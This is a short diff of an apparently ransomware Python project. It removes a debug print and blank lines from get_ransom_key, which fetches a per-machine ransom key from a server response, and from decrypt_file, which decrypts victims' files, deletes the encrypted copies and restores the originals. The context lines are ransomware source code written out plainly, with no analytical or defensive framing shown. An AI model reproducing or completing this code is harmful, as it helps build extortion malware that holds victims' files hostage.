@@ -18,10 +18,8 @@ def get_ransom_key(mac):
         return -1
 
     ransom_key = req.content.strip()
-    print(ransom_key)
     if str(ransom_key) == -1:
         return -1
-
     return base64.decodebytes(ransom_key)
 
 def decrypt_file(file_name, ransom_key):
@@ -30,7 +28,6 @@ def decrypt_file(file_name, ransom_key):
 
     with open(file_name, "rb") as f:
         file_data = f.read() 
-
     encrypted_bytes = BytesIO(base64.decodebytes(file_data))
     nonce = encrypted_bytes.read(16)
     tag = encrypted_bytes.read(16)
@@ -42,7 +39,6 @@ def decrypt_file(file_name, ransom_key):
 
     os.remove(file_name)
     DECRYPTED_FILES.add(file_name)
-
     file_name = file_name[:-4]
     with open(file_name, "wb") as f:
         f.write(plain_text)
